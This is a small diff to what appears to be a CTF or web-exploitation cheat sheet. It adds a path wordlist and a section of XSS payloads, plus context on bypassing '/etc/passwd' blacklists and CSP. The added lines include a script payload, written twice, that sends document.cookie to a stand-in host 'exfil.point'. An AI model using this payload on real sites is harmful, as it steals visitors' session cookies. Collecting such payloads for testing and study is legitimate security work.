@@ -48,6 +48,7 @@ carey / cry
 9447 / 6841 / 6441
 robots.txt
 flag
+ /lol, /fuck, /1, /test, /sy
 ```
 List of /etc/{blah} files (in case some strings are blacklisted e.g. "/etc/passwd")  
 `https://www.tldp.org/LDP/sag/html/etc-fs.html`
@@ -375,6 +376,12 @@ document.location()
 window.location.replace()
 window.location.reload()
 window.location.assign()
+```
+
+**Standard Payloads ad Filter Evasion**
+```
+<script>document.write(“<img src=http://exfil.point/lol?”+document.cookie);</script>
+<script>document.write(“<img src=http://exfil.point/lol?”+document.cookie);</script>
 ```
 
 **CSP Bypass**  
